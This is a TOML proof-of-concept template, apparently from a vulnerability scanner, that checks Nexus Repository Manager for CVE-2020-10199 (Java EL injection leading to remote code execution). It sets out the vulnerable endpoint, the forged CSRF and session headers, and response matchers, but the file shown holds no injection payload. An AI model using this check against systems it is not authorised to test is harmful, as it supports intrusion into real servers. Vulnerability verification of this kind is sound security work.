[info]
author = "ave"
description = "PoC/EXP for verification"
id = "POC-AVE-2020-0106"
name = "Sonatype Nexus Repository Manager Java EL 注入 RCE PoC"
severity = "high"
tags = ["ave-2020-0106"]
vuln_id = [
    "CVE-2020-10199",
    "AVE-2020-0106",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/service/rest/beta/repositories/go/group"
protocol = "http"

[poc.requests.headers]
Content-Type = "application/json"
Cookie = "NX-ANTI-CSRF-TOKEN=1; NXSESSIONID=1"
NX-ANTI-CSRF-TOKEN = "1"
X-Nexus-UI = "true"
X-Requested-With = "XMLHttpRequest"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["A9999"]

[[poc.requests.matchers]]
expect = true
status = [400]
type = "status"
